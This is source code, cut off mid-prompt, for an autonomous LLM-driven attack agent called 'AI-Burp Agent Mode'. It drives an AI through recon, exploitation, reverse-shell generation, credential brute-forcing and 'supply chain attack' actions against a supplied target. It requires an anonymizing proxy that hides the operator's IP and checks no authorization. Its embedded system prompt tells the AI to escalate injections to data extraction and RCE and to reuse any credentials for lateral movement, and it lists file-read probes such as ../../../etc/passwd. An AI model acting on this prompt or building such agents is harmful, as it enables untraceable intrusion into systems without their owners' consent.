"""
AI-Burp Agent Mode
自主安全研究 Agent - 内置 LLM 驱动决策循环

用法:
    aiburp-ide agent start <project_id> --target <url>
    aiburp-ide agent status
    aiburp-ide agent stop

环境变量:
    OPENAI_API_KEY=sk-xxx          # OpenAI
    ANTHROPIC_API_KEY=sk-ant-xxx   # Claude (优先)
    AIBURP_LLM_MODEL=gpt-4         # 指定模型
"""

import os
import json
import asyncio
from pathlib import Path

# 加载 .env 文件
try:
    from dotenv import load_dotenv
    # 尝试从多个位置加载 .env
    env_paths = [
        Path(__file__).parent.parent / ".env",  # ai-burp/.env
        Path.cwd() / ".env",                     # 当前目录
    ]
    for env_path in env_paths:
        if env_path.exists():
            load_dotenv(env_path)
            break
except ImportError:
    pass  # dotenv 未安装，使用系统环境变量
from typing import Optional, Dict, Any, List
from dataclasses import dataclass
from .orchestrator import SecurityOrchestrator
from .prompts import PromptTemplates


@dataclass
class LLMConfig:
    """LLM 配置"""
    provider: str  # openai, anthropic
    api_key: str
    model: str
    base_url: str = None  # 自定义 API 地址
    max_tokens: int = 4096
    temperature: float = 0.7
    name: str = None  # 配置名称（用于显示）


class LLMClient:
    """
    LLM 客户端 - 支持多配置自动回退

    配置优先级（自动检测环境变量）:
      1. OPENAI_API_KEY + OPENAI_API_BASE  → openai-primary
      2. OPENAI_BACKUP_API_KEY + OPENAI_BACKUP_API_BASE  → openai-backup
      3. ANTHROPIC_API_KEY  → anthropic

    当主 API 调用失败时自动回退到下一个可用配置。
    """

    def __init__(self, config: LLMConfig = None):
        self._configs = []
        self._config_index = 0
        self._client = None
        self._fallback_history = []

        if config:
            self._configs = [config]
        else:
            self._configs = self._auto_detect_configs()

        if self._configs:
            self._current_config = self._configs[0]
            self._init_client()

    def _auto_detect_configs(self) -> List[LLMConfig]:
        """自动检测所有可用的 LLM 配置，按优先级排序"""
        configs = []

        # 1. 主 OpenAI 配置（自定义 base_url）
        openai_key = os.getenv("OPENAI_API_KEY")
        if openai_key:
            configs.append(LLMConfig(
                provider="openai",
                api_key=openai_key,
                model=os.getenv("AIBURP_LLM_MODEL", "gpt-4"),
                base_url=os.getenv("OPENAI_API_BASE") or os.getenv("OPENAI_BASE_URL"),
                name="openai-primary"
            ))

        # 2. 备份 OpenAI 配置
        backup_key = os.getenv("OPENAI_BACKUP_API_KEY")
        if backup_key:
            configs.append(LLMConfig(
                provider="openai",
                api_key=backup_key,
                model=os.getenv("OPENAI_BACKUP_MODEL") or os.getenv("AIBURP_LLM_MODEL", "gpt-4"),
                base_url=os.getenv("OPENAI_BACKUP_API_BASE"),
                name="openai-backup"
            ))

        # 3. Anthropic
        anthropic_key = os.getenv("ANTHROPIC_API_KEY")
        if anthropic_key:
            configs.append(LLMConfig(
                provider="anthropic",
                api_key=anthropic_key,
                model=os.getenv("AIBURP_LLM_MODEL", "claude-3-5-sonnet-20241022"),
                name="anthropic"
            ))

        return configs

    def _init_client(self):
        """初始化当前配置的客户端"""
        if not self._configs or self._config_index >= len(self._configs):
            self._client = None
            return

        config = self._configs[self._config_index]
        self._current_config = config

        if config.provider == "anthropic":
            try:
                import anthropic
                self._client = anthropic.Anthropic(api_key=config.api_key)
            except ImportError:
                print("⚠️ anthropic 包未安装，运行: pip install anthropic")
                self._client = None

        elif config.provider == "openai":
            try:
                import openai
                if config.base_url:
                    self._client = openai.OpenAI(
                        api_key=config.api_key,
                        base_url=config.base_url
                    )
                else:
                    self._client = openai.OpenAI(api_key=config.api_key)
            except ImportError:
                print("⚠️ openai 包未安装，运行: pip install openai")
                self._client = None

    def _fallback(self):
        """切换到下一个可用配置"""
        self._config_index += 1
        if self._config_index < len(self._configs):
            prev_name = self._configs[self._config_index - 1].name
            next_name = self._configs[self._config_index].name
            print(f"⚠️ [{prev_name}] 不可用，回退到 [{next_name}]")
            self._fallback_history.append(f"{prev_name} → {next_name}")
            self._init_client()
            return True
        else:
            self._client = None
            return False

    @property
    def is_available(self) -> bool:
        """检查是否有可用的 LLM 配置"""
        if self._client is not None:
            return True
        # 尝试是否有未初始化的配置可用
        return self._config_index < len(self._configs)

    def ask(self, prompt: str, system_prompt: str = None) -> str:
        """
        发送请求到 LLM，自动回退

        Args:
            prompt: 用户 prompt
            system_prompt: 系统 prompt (可选)

        Returns:
            LLM 响应文本
        """
        if not self._client and not self._fallback():
            raise RuntimeError("LLM 客户端未初始化，请检查 API Key 配置")

        last_error = None
        while self._client:
            try:
                if self._current_config.provider == "anthropic":
                    return self._ask_anthropic(prompt, system_prompt)
                elif self._current_config.provider == "openai":
                    return self._ask_openai(prompt, system_prompt)
                else:
                    raise ValueError(f"不支持的 provider: {self._current_config.provider}")
            except Exception as e:
                last_error = e
                print(f"⚠️ [{self._current_config.name}] 调用失败: {e}")
                if not self._fallback():
                    break
                continue

        error_msg = f"所有 LLM 配置均失败 ({len(self._configs)} 个)"
        if self._fallback_history:
            error_msg += f": {' → '.join(self._fallback_history)}"
        if last_error:
            error_msg += f"\n最后错误: {last_error}"
        raise RuntimeError(error_msg)
    
    def _ask_anthropic(self, prompt: str, system_prompt: str = None) -> str:
        """Anthropic Claude API"""
        config = self._current_config
        message = self._client.messages.create(
            model=config.model,
            max_tokens=config.max_tokens,
            system=system_prompt or PromptTemplates.RESEARCHER_ROLE,
            messages=[
                {"role": "user", "content": prompt}
            ]
        )
        return message.content[0].text

    def _ask_openai(self, prompt: str, system_prompt: str = None) -> str:
        """OpenAI API"""
        config = self._current_config
        messages = []
        if system_prompt:
            messages.append({"role": "system", "content": system_prompt})
        else:
            messages.append({"role": "system", "content": PromptTemplates.RESEARCHER_ROLE})

        messages.append({"role": "user", "content": prompt})

        response = self._client.chat.completions.create(
            model=config.model,
            messages=messages,
            max_tokens=config.max_tokens,
            temperature=config.temperature
        )
        return response.choices[0].message.content


class ActionParser:
    """
    解析 LLM 返回的 Action 指令
    
    支持的 Action 格式:
    ```json
    {
        "action": "probe|scan|fuzz|finding|exploration|complete",
        "params": {...}
    }
    ```
    """
    
    VALID_ACTIONS = [
        "probe",           # 探测参数 (HTTP)
        "scan",            # 漏洞扫描 (HTTP)
        "fuzz",            # 批量测试
        "finding",         # 记录发现
        "exploration",     # 记录探索
        "memory",          # 存储记忆
        "think",           # 继续思考 (不执行工具)
        "complete",        # 完成审计
        # V4: 多协议 traffic 层
        "traffic_probe",   # 多协议探活
        "traffic_scan",    # 批量端口扫描
        # V4: 资产情报层
        "intel_lookup",    # 情报聚合查询 (Shodan/Censys/VT/OTX/SecurityTrails/MyIP.ms)
        "asset_expand",    # 资产扩展 (子域名/旁站/C段/WHOIS)
        "cdn_bypass",      # CDN 检测+绕过 (找源 IP)
        "github_leaks",    # GitHub 泄露搜索
        # V4: 漏洞利用层
        "check_unauth",    # 未授权检测 (Redis/Docker/MySQL/SSH/SMB)
        "jwt_analyze",     # JWT 解码/暴力/伪造
        "logic_scan",      # 业务逻辑漏洞 (IDOR/越权/竞争条件)
        "exploit",         # N-day exploit (Log4j/Fastjson/Shiro/SSTI/Spring)
        "revshell",        # 反弹 shell 生成
        "traffic_analyze", # 被动流量分析
        "attack_checklist",# 全维度攻击清单 (14 维自动方法论)
"inject",          # ⭐ 多通道参数注入 (GET/POST/Cookie/Header × SQLi/XSS/SSRF/IDOR)
	        "login_brute",     # ⭐ 凭据爆破 (phpMyAdmin/WordPress/通用登录表单)
	        "supply_chain",    # ⭐ 供应链攻击编排 (CDN绕过→资产扩展→面板检测)
	        "detect_panel",    # 主机面板指纹识别 (cPanel/WHM/Plesk 等)
	        "start_listener",  # 启动流量采集器 (Burp 式 MITM 代理)
	        "observe",         # 观察当前流量采集数据, 不主动发包
	        "full_audit",      # 端到端全自动审计 (资产→清单→漏洞→利用)
    ]
    
    @staticmethod
    def parse(response: str) -> Optional[Dict]:
        """
        从 LLM 响应中解析 Action
        
        尝试提取 JSON 块
        """
        # 尝试找 ```json ... ``` 块
        import re
        json_match = re.search(r'```json\s*(.*?)\s*```', response, re.DOTALL)
        if json_match:
            try:
                return json.loads(json_match.group(1))
            except json.JSONDecodeError:
                pass
        
        # 尝试找 { ... } 块
        brace_match = re.search(r'\{[^{}]*"action"[^{}]*\}', response, re.DOTALL)
        if brace_match:
            try:
                return json.loads(brace_match.group(0))
            except json.JSONDecodeError:
                pass
        
        # 没找到有效 Action
        return None
    
    @staticmethod
    def validate(action: Dict) -> bool:
        """验证 Action 格式"""
        if not action:
            return False
        if "action" not in action:
            return False
        if action["action"] not in ActionParser.VALID_ACTIONS:
            return False
        return True


class SecurityAgent:
    """
    安全研究 Agent
    
    自主循环: Prompt → LLM → Action → Execute → Update → Repeat
    """
    
    def __init__(self, project_id: str, proxy_manager=None):
        self.project_id = project_id
        self.orchestrator = SecurityOrchestrator(project_id)
        self.llm = LLMClient()
        self.parser = ActionParser()
        self.proxy_manager = proxy_manager  # A-2: 代理管理器

        self.max_iterations = 50  # 最大迭代次数
        self.iteration = 0
        self.running = False
        self.history: List[Dict] = []  # 对话历史
        self._discovered: Dict = {}  # A-3: 上下文累积
        self._auto_followup: bool = True  # A-6: 自动跟进开关
        self._real_ip: str = ""        # OpSec: 已知的真实出口 IP (用于比对)
        self._proxy_verified: bool = False  # OpSec: 代理是否已验证生效
        self._proxy_required: bool = True   # OpSec: 是否强制要求代理 (默认开)
        self._proxy_ip: str = ""       # OpSec: 已验证的代理出口 IP
        self.journal = None  # TrafficJournal: 启动时按需创建

        # V4 ALL-IN-TRAFFIC: 共享 TrafficEngine 实例
        # 避免每个 action 自建 engine 造成连接池/代理状态/journal 碎片化.
        # 由于 engine 是 async 上下文管理器, 用延迟初始化 + 同步包装.
        self.engine: Optional[object] = None  # TrafficEngine, 通过 _ensure_engine() 初始化
        self._engine_lock_id: Optional[int] = None  # asyncio.run 之间的锁, 用 id() 防并发
        self._engine_loop: Optional[object] = None   # 拥有 engine 的事件循环

    def _ensure_engine(self):
        """
        确保共享 TrafficEngine 已创建.
        V4: 必须在 async 上下文中调用, engine 绑定当前 running loop.
        """
        import asyncio
        from .traffic import TrafficEngine
        try:
            cur_loop = asyncio.get_running_loop()
        except RuntimeError:
            # 不在 async 上下文中 — 无法安全创建 engine
            return None

        if (self.engine is None
            or self._engine_loop is None
            or self._engine_loop.is_closed()
            or self._engine_loop is not cur_loop):
            # 新建或 loop 变了 → 重建
            if self.engine is not None:
                # 旧 engine 的 loop 可能已关闭, 尝试清理
                try:
                    asyncio.ensure_future(self.engine.close())
                except Exception:
                    pass
            eng = TrafficEngine(proxy_manager=self.proxy_manager)
            self.engine = eng
            self._engine_loop = cur_loop
        return self.engine

    async def _run_with_engine(self, coro_factory):
        """
        用共享 engine 跑协程工厂.
        V4: 在单一长效 loop 内运行, 不再 asyncio.run() 创建临时 loop.

        coro_factory: 接收 engine 实例, 返回一个 coroutine.
        """
        eng = self._ensure_engine()
        if eng is None:
            # 兜底: 现场建, 用完即关
            from .traffic import TrafficEngine
            async with TrafficEngine(proxy_manager=self.proxy_manager) as e:
                return await coro_factory(e)
        # 共享 engine 不能走 async with (会被 close), 直接传引用
        return await coro_factory(eng)

    async def _close_engine_async(self):
        """在 async 上下文中关闭 engine."""
        if self.engine is not None:
            try:
                await self.engine.close()
            except Exception:
                pass
            self.engine = None
            self._engine_loop = None

    def close(self):
        """释放共享 engine (Agent 结束/异常时调用). 同步入口."""
        import asyncio
        if self.engine is not None:
            try:
                # 尝试在已有 loop 中关闭
                loop = asyncio.get_running_loop()
                # 如果在 async 上下文中, schedule close
                asyncio.ensure_future(self._close_engine_async())
            except RuntimeError:
                # 不在 async 上下文中, 用临时 loop
                try:
                    asyncio.run(self._close_engine_async())
                except Exception:
                    pass
            self.engine = None
            self._engine_loop = None

    def _ensure_journal(self):
        """确保 TrafficJournal 已创建 (延迟初始化)."""
        if self.journal is None:
            from .traffic.traffic_journal import TrafficJournal
            self.journal = TrafficJournal(max_entries=500)
        return self.journal

    def _get_http_session(self) -> "requests.Session":
        """
        获取一个真正的同步 requests.Session。
        仅用于不兼容 async 的第三方库调用（hosting_panel_detect / MultiChannelInjector）。
        不走 V4 engine 的 async client，但共享代理配置。

        V4 修复:
        - 若 _proxy_required=True 且拿不到代理, 抛异常而非静默直连
        - 接通 mark_result 反馈环 (H1): response hook 自动回调 proxy_manager
        """
        import requests
        import urllib3
        urllib3.disable_warnings()
        session = requests.Session()
        session.verify = False
        session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        proxy_url = None
        if self.proxy_manager:
            try:
                proxy_url = self.proxy_manager.get_proxy()
            except Exception:
                pass
        if proxy_url:
            # 检查 socks5h 代理是否安装了 PySocks
            if proxy_url.startswith(("socks5://", "socks5h://")):
                try:
                    import socks  # noqa: F401
                except ImportError:
                    raise RuntimeError(
                        "OpSec: 代理是 socks5 协议但未安装 PySocks。"
                        "请运行 pip install 'requests[socks]' 或 pip install PySocks。"
                    )
            session.proxies = {'http': proxy_url, 'https': proxy_url}

            # H1: 接通 mark_result 反馈环
            _pm = self.proxy_manager
            _purl = proxy_url
            def _on_response(resp, *args, **kwargs):
                """每次请求完成后回调 proxy_manager.mark_result"""
                if _pm:
                    try:
                        latency = resp.elapsed.total_seconds() * 1000
                        success = resp.status_code < 500
                        _pm.mark_result(_purl, success, latency)
                    except Exception:
                        pass
            session.hooks = {'response': _on_response}
        elif getattr(self, '_proxy_required', False) and not getattr(self, '_proxy_verified', False):
            # OpSec: 强制代理模式下无代理 = 裸奔, 拒绝返回直连 session
            raise RuntimeError(
                "OpSec 拒绝: _proxy_required=True 但无可用代理。"
                "请先配置 proxy_manager 或设置 _proxy_required=False。"
            )
        return session

    @property
    def is_ready(self) -> bool:
        """检查 Agent 是否就绪"""
        return self.llm.is_available

    def _get_real_ip(self) -> str:
        if self._real_ip:
            return self._real_ip
        import requests as _req
        sess = _req.Session()
        sess.trust_env = False
        sess.verify = False
        sess.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        services = [
            ('https://api.ipify.org?format=json', True,  lambda d: d.get('ip', '')),
            ('https://icanhazip.com',              False, lambda d: d.strip()),
            ('https://checkip.amazonaws.com',       False, lambda d: d.strip()),
            ('https://ifconfig.me',                 False, lambda d: d.strip()),
        ]
        for url, is_json, extractor in services:
            try:
                r = sess.get(url, timeout=4)
                if r.status_code != 200:
                    continue
                data = r.json() if is_json else r.text
                ip = extractor(data)
                if ip and '.' in ip and not ip.startswith('127.'):
                    self._real_ip = ip
                    sess.close()
                    return ip
            except Exception:
                continue
        self._real_ip = "unknown"
        sess.close()
        return "unknown"

    def verify_proxy(self) -> Dict:
        result = {"ok": False, "real_ip": "", "proxy_ip": "", "safe": False}
        result["real_ip"] = self._get_real_ip()
        if result["real_ip"] == "unknown":
            result["error"] = "无法获取真实 IP, 使用备用验证"
            return result

        proxy_candidates = []
        if self.proxy_manager:
            proxy_candidates = self.proxy_manager.get_proxies(8)
        if not proxy_candidates:
            result["error"] = "无可用代理"
            return result

        import requests as _req
        safe_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }

        for proxy_url in proxy_candidates[:8]:
            try:
                r = _req.get('https://api.ipify.org?format=json', timeout=5,
                             proxies={'http': proxy_url, 'https': proxy_url},
                             headers=safe_headers, verify=False)
                if r.status_code == 200:
                    exit_ip = r.json().get('ip', '')
                    if exit_ip and exit_ip != result["real_ip"]:
                        result["proxy_ip"] = exit_ip
                        result["safe"] = True
                        result["ok"] = True
                        self._proxy_verified = True
                        self._proxy_ip = exit_ip
                        if self.proxy_manager:
                            self.proxy_manager.mark_result(proxy_url, True, 0)
                        return result
                    elif exit_ip:
                        if self.proxy_manager:
                            self.proxy_manager.mark_result(proxy_url, False, 0)
                        continue
            except Exception:
                pass
            if self.proxy_manager:
                self.proxy_manager.mark_result(proxy_url, False, 0)

        result["error"] = f"所有代理验证失败 ({len(proxy_candidates)} 个)"
        return result
    
    def run(self, initial_instruction: str = None) -> Dict:
        """
        运行 Agent 主循环 — V4 单一长效 loop 入口.

        Args:
            initial_instruction: 初始指令 (可选)

        Returns:
            最终状态
        """
        import asyncio
        if not self.is_ready:
            return {
                "ok": False,
                "error": "LLM 未配置，请设置 OPENAI_API_KEY 或 ANTHROPIC_API_KEY"
            }

        # OpSec 安全闸门
        if self._proxy_required:
            print("🔒 OpSec 安全闸门: 验证代理...")
            pv = self.verify_proxy()
            if pv.get("safe"):
                print(f"✅ 代理验证通过: 真实IP={pv['real_ip']} → 出口IP={pv['proxy_ip']}")
            else:
                msg = pv.get("error", "")
                print(f"⚠️ {msg}")
                # 备用验证: 尝试代理直接获取出口 IP
                import requests as _req
                verified = False
                for proxy_url in (self.proxy_manager.get_proxies(8) if self.proxy_manager else []):
                    try:
                        r = _req.get("https://icanhazip.com", timeout=5,
                                     proxies={'http': proxy_url, 'https': proxy_url},
                                     verify=False)
                        if r.status_code == 200:
                            proxy_ip = r.text.strip()
                            if proxy_ip and proxy_ip != pv.get("real_ip", ""):
                                self._proxy_ip = proxy_ip
                                self._proxy_verified = True
                                verified = True
                                print(f"✅ 备用验证通过: 出口IP={proxy_ip}")
                                break
                    except Exception:
                        continue
                if not verified:
                    print("🔴 Agent 拒绝在无代理保护下运行")
                    return {"ok": False, "error": f"OpSec 拒绝运行: {msg}", "opsec": pv}

        try:
            return asyncio.run(self._async_run(initial_instruction))
        except KeyboardInterrupt:
            print("\n⏹️ Agent 被用户中断")
            return {"ok": False, "error": "用户中断", "iterations": self.iteration}
        finally:
            self.running = False
            self.close()

    async def _async_run(self, initial_instruction: str = None) -> Dict:
        """
        V4 async 主循环 — 在单一长效 event loop 中运行.
        engine 在此 loop 内创建, 所有 _run_with_engine 调用共享同一 loop.
        """
        self.running = True
        self.iteration = 0
        self._phase = 0

        print(f"🚀 Agent 启动: {self.project_id}")
        print(f"📡 LLM: {self.llm._current_config.provider}/{self.llm._current_config.model}")
        print("-" * 50)

        # === V4 三段论: 四阶段自动 pipeline ===
        target = initial_instruction or ""
        breakthroughs = []
        confirmed = []

        if target and target.strip():
            # Phase ①: 打点
            print(f"\n{'='*60}")
            print(f"  Phase ①: 打点 — 零 payload 资产收集")
            print(f"{'='*60}")
            try:
                import asyncio as _aio
                p1 = await _aio.wait_for(
                    self._run_phase1_auto(target), timeout=90
                )
                print(f"  {p1.get('summary', 'done')}")
            except _aio.TimeoutError:
                print(f"  [WARN] Phase ① 超时 (90s), 跳过")
            except Exception as e:
                print(f"  [WARN] Phase ① 失败: {e}")

            # Phase ②: 流量化
            print(f"\n{'='*60}")
            print(f"  Phase ②: 流量化 — 零 payload 正常流量采集")
            print(f"{'='*60}")
            try:
                import asyncio as _aio
                p2 = await _aio.wait_for(
                    self._trafficify_assets(), timeout=60
                )
                if p2.get("ok"):
                    print(f"  新增 {p2.get('entries_added', 0)} 条流量")
                else:
                    print(f"  [WARN] 流量化失败: {p2.get('error')}")
            except Exception as e:
                print(f"  [WARN] Phase ② 失败: {e}")
            self._phase = 2

            # Phase ③: LLM 分析
            print(f"\n{'='*60}")
            print(f"  Phase ③: LLM 分析 — 读流量找突破口")
            print(f"{'='*60}")
            try:
                p3 = self._llm_analyze_journal(target=target)
                breakthroughs = p3.get("breakthroughs", [])
                print(f"  {p3.get('summary', 'done')}")
                for i, bt in enumerate(breakthroughs):
                    print(f"    [{i+1}] [{bt.get('confidence','?')}] "
                          f"{bt.get('type','?')} → {bt.get('target','?')[:60]} "
                          f"(payload: {bt.get('payload_category','?')})")
            except Exception as e:
                print(f"  [WARN] Phase ③ 失败: {e}")
            self._phase = 3

            # Phase ④: 精准验证
            print(f"\n{'='*60}")
            print(f"  Phase ④: 精准验证 — 按突破口发 payload")
            print(f"{'='*60}")
            for bt in breakthroughs:
                try:
                    result = await self._verify_breakthrough(bt)
                    if result.get("confirmed"):
                        confirmed.append(bt)
                        print(f"  ✅ 确认: {bt.get('type','?')} @ {bt.get('target','?')[:60]}")
                    elif result.get("needs_rerun"):
                        print(f"  ↩️ 回退补点: {bt.get('payload_category')} 需要更多探测")
                except Exception as e:
                    print(f"  [WARN] 验证失败: {e}")
            self._phase = 4
            print(f"\n  确认 {len(confirmed)}/{len(breakthroughs)} 个突破口")

            # 构造上下文消息给 OODA 循环
            inv_size = len(getattr(self, "_inventory", None) and self._inventory.items or [])
            jr_size = len(self._ensure_journal()._entries)
            context_msg = (
                f"目标: {target}\n"
                f"资产清单: {inv_size} 项\n"
                f"流量日志: {jr_size} 条\n"
                f"突破口: {len(breakthroughs)} 个 (已确认 {len(confirmed)})\n"
                f"请根据已验证的突破口深入利用, 或要求继续打点/流量化."
            )
            initial_instruction = context_msg

        try:
            while self.running and self.iteration < self.max_iterations:
                self.iteration += 1
                print(f"\n🔄 迭代 {self.iteration}/{self.max_iterations}")

                # 1. 生成 Prompt
                prompt = self._build_prompt(initial_instruction if self.iteration == 1 else None)

                # 2. 调用 LLM
                print("🤖 思考中...")
                try:
                    response = self.llm.ask(prompt)
                except Exception as llm_err:
                    print(f"⚠️ LLM 不可用: {str(llm_err)[:100]}")
                    print("📋 Phase ①-④ 已完成, 跳过 OODA 迭代, 直接输出报告")
                    break
                print(f"💭 响应: {response[:200]}...")

                # 3. 解析 Action
                action = self.parser.parse(response)

                if not action:
                    print("⚠️ 未检测到有效 Action，继续思考")
                    self.history.append({
                        "iteration": self.iteration,
                        "response": response,
                        "action": None
                    })
                    continue

                if not self.parser.validate(action):
                    print(f"⚠️ 无效 Action: {action}")
                    continue

                print(f"🎯 Action: {action['action']}")

                # 认知字段展示 (精英猎人作战日志)
                mental = action.get("mental_model", "")
                hypothesis = action.get("hypothesis", "")
                if mental:
                    print(f"🧠 心智模型: {mental[:120]}")
                if hypothesis:
                    print(f"🔬 假设: {hypothesis[:120]}")

                # 4. 执行 Action
                if action["action"] == "complete":
                    print("✅ 审计完成")
                    self.running = False
                    break

                result = await self._execute_action(action)
                # 摘要打印 (不超过 200 字符)
                summary = self._summarize_result(action.get("action", ""), action.get("params", {}), result)
                print(f"📊 结果: {summary[:200]}")

                # 认知更新展示 (Agent 自己对结果的理解)
                update = action.get("update", "")
                if update:
                    print(f"🔄 认知更新: {update[:120]}")

                # A-6: 自动跟进 — 发现高危服务时自动深入
                if self._auto_followup and result.get("ok"):
                    followups = self._check_auto_followup(action, result)
                    for fu_action, fu_params in followups:
                        print(f"🔄 自动跟进: {fu_action} {fu_params}")
                        fu_result = await self._execute_action({"action": fu_action, "params": fu_params})
                        fu_summary = self._summarize_result(fu_action, fu_params, fu_result)
                        print(f"   跟进结果: {fu_summary[:150]}")
                        self.history.append({
                            "iteration": self.iteration,
                            "action": {"action": fu_action, "params": fu_params},
                            "result": fu_result,
                            "summary": fu_summary,
                            "auto_followup": True,
                        })

                # 5. 记录历史 (含摘要, 供下一轮 LLM 决策)
                self.history.append({
                    "iteration": self.iteration,
                    "action": action,
                    "result": result,
                    "summary": summary,
                })

                # 6. 检查是否需要停止
                if action["action"] == "think":
                    # 纯思考，不计入迭代
                    self.iteration -= 1

            return {
                "ok": True,
                "iterations": self.iteration,
                "findings": self.orchestrator.state.get("findings", []),
                "explorations": self.orchestrator.state.get("exploration", {})
            }

        except Exception as e:
            print(f"\n❌ Agent 错误: {e}")
            return {"ok": False, "error": str(e), "iterations": self.iteration}

        finally:
            self.running = False
            # 在同一 event loop 内关闭 engine, 避免 close() 用新 loop 卡死
            if self.engine is not None:
                try:
                    await self._close_engine_async()
                except Exception:
                    pass
                self.engine = None
                self._engine_loop = None
    
    def _build_prompt(self, initial_instruction: str = None) -> str:
        """构建 Prompt — 红队侦察导向"""

        # === System Prompt: 精英赏金猎人作战大脑 ===
        system_prompt = """# 精英渗透测试 Agent — 作战大脑

## 一、身份与信条

你是顶级赏金猎人的作战大脑。你的工作不是"扫漏洞"，而是
**"理解系统如何运作，然后找到它不该运作的方式"**。

四条不可动摇的信条：
1. **流量是唯一的真相来源** — 每个请求/响应都在泄露系统如何工作。
   不读懂流量就发 payload = 蒙眼开枪。任何资产，先吃透流量再动手。
2. **理解先于攻击** — 发第一个攻击 payload 前，你必须能回答：
   "这是什么系统？输入从哪进？信任边界在哪？业务逻辑是什么？"
3. **工具是手段，思维是核心** — Nuclei/SQLMap 只发现已知模式。
   真正的突破来自你对业务逻辑的理解和创造性假设。
4. **不许闷头冲** — 每次行动前形成假设，每次行动后更新认知。
   盲目爆破 = 失败。遇到阻力要换维度，不要死磕。

## 二、认知循环（OODA）— 每个资产必走一遍

### O 观察 (Observe) — 榨干流量
不要急着发 payload。先把已有流量读透：
- 响应头：Server / X-Powered-By / Set-Cookie / 缺失的安全头 / WWW-Authenticate
- 响应体：版本号 / 框架指纹 / 错误堆栈 / 注释 / 隐藏字段 / 内部路径 / API 端点
- 请求面：URL 参数 / 表单字段 / Cookie 结构 / 自定义头 / 请求体编码

### O 定向 (Orient) — 建立心智模型
用一句话回答：**"这个系统怎么工作，信任边界在哪？"**
- 认证机制是什么？（Session / JWT / Basic / OAuth / 无）
- 授权检查在哪一层？（网关 / 应用 / 数据库）
- 用户输入流到哪里？（数据库 / 文件系统 / 命令 / 内部网络 / 模板）

### D 决策 (Decide) — 假设驱动，不是 payload 海洋
不要"试一堆 payload"。而是：
1. 观察到一个现象（例：参数 user_id=123 是数字）
2. 形成假设："如果这里没做越权校验，改 124 应该返回别人的数据"
3. 用一个精准 payload 验证（user_id=124）
4. 根据结果更新模型

### A 行动 (Act) — 最小代价验证
每个 payload 都要有明确目的。优先低成本高信号的测试：
- 先无害探测（'、../、{{{{7*7}}}}、127.0.0.1）再看回显
- 先看错误响应再看正常响应，差异即信息
- 先未授权访问再认证后访问

## 三、资产画像（动手前强制输出）

不同资产，不同打法。对每个目标，先判断它属于哪类，再选剧本：

| 资产类型 | 核心问题 | 首选攻击面 |
|---|---|---|
| 静态展示站 | 旧技术?子域接管?信息泄露? | CVE匹配/目录/.git/备份文件 |
| API 接口 | 认证模型?IDOR?参数篡改? | 未授权/越权/批量赋值/参数污染 |
| 登录/认证 | 凭证?会话?注入? | 认证绕过/JWT/会话固定/SQLi登录 |
| 后台面板 | 默认凭证?路径可达? | 未授权访问/弱口令/路径穿越 |
| 文件上传 | 类型校验?存储路径? | 扩展名/Content-Type/魔术字节/路径 |
| 网关/代理 | 转发逻辑?内部访问? | SSRF/请求走私/头注入 |
| 中间件 | 版本?默认配置? | 未授权(Redis/Docker)/N-day |
| 重定向类 | 目标可控?协议? | 开放重定向/SSRF/元数据 |

## 四、流量七层解剖（全部覆盖，不许只看响应体）

1. **请求行** — 方法(GET/PUT/DELETE)、路径归一化(//admin、/./、%2e)、HTTP 版本
2. **请求头** — Host(缓存投毒)、X-Forwarded-For(信任绕过)、Authorization、Cookie、Referer、UA
3. **请求体** — 参数语义(id/role/price/url/file)、序列化、Base64、隐藏字段
4. **响应状态** — 错误码差异、重定向链、401 vs 403 vs 404 的语义
5. **响应头** — Server 版本、CORS 通配、缺失安全头、Set-Cookie 属性
6. **响应体** — 反射点(XSS)、错误信息(SQLi/堆栈)、版本号(CVE)、内部 IP/路径
7. **跨请求** — 会话演化(固定/轮转)、响应大小/时间差异、频率模式(无限速接口)

## 五、业务逻辑理解（最高价值，工具扫不出）

对每个参数问"如果它没做好校验，会发生什么？"
- user_id=123 → 改 124 → IDOR?
- role=user → 改 admin → 提权?
- price=99.9 → 改 0/-1/0.01 → 篡改?
- redirect_url= → 指向恶意站 → OAuth 劫持?
- file=report.pdf → ../../../etc/passwd → LFI?
- verified=0 → 改 1 → 绕过验证/未授权登录?
- isAdmin=false → 改 true → 批量赋值?

## 六、非常规入口（别人不看的地方）

- API 版本差异：/api/v1/ vs /v2/ 鉴权可能不同
- 调试接口：/debug /test /actuator /swagger /graphql /api-docs
- 旧版/废弃端点：被遗忘但仍可达
- 错误信息：堆栈跟踪、SQL 错误、绝对路径 → 技术栈全暴露
- HTTP 方法：GET 改 PUT/DELETE/PATCH，看是否绕过 ACL
- 头部注入：Host / X-Original-URL / X-Rewrite-URL

## 七、决策纪律

**暂停并重新定向，当：**
- 连续 3 次同类测试无新发现 → 换维度/换资产，别死磕
- 响应完全不符合预期 → 先搞懂为什么，别强行解释
- 发现高危服务(Redis/Docker未授权) → 立即跟进，这是最高优先级

**升级攻击，当：**
- 确认一个低危(信息泄露) → 用泄露的信息升级到高危
- 发现一个注入点 → 从探测升级到数据提取/RCE
- 拿到任一凭证 → 立即横向测试越权/提权

**止损，当：**
- 资产确认是 CDN/静态/无交互 → 转向旁站/子域/源 IP
- 目标有强 WAF 且无绕过思路 → 记录后转向其他资产，别耗时间

## 决策原则

1. 从被动到主动：先收集，再触碰。
2. 从广到深：先大范围，再单点深入。
3. 每步有依据：基于发现决定下一步，不盲目。
4. 优先高危：未授权 > 注入 > 越权 > 泄露 > XSS。
5. ⭐ 流量为王：请求/响应/会话/交互全是攻击面，不只看响应体。
6. ⭐ 资产定制：不同资产不同剧本，没有万能打法。
7. ⭐ 假设驱动：观察→假设→精准验证→更新，拒绝 payload 海洋。

## 可用工具

### Phase 0: 资产情报 (不触碰目标, 低噪音)
intel_lookup — 情报聚合 (6 平台): 输入域名/IP → ISP/ASN/端口/CVE/旁站/子域名
{"action": "intel_lookup", "params": {"target": "target.com"}}

asset_expand — 资产扩展: 输入域名 → 子域名/旁站/C段/WHOIS
{"action": "asset_expand", "params": {"domain": "target.com"}}

cdn_bypass — CDN 检测+绕过: 6 种方法找源 IP
{"action": "cdn_bypass", "params": {"domain": "target.com"}}

github_leaks — GitHub 泄露搜索
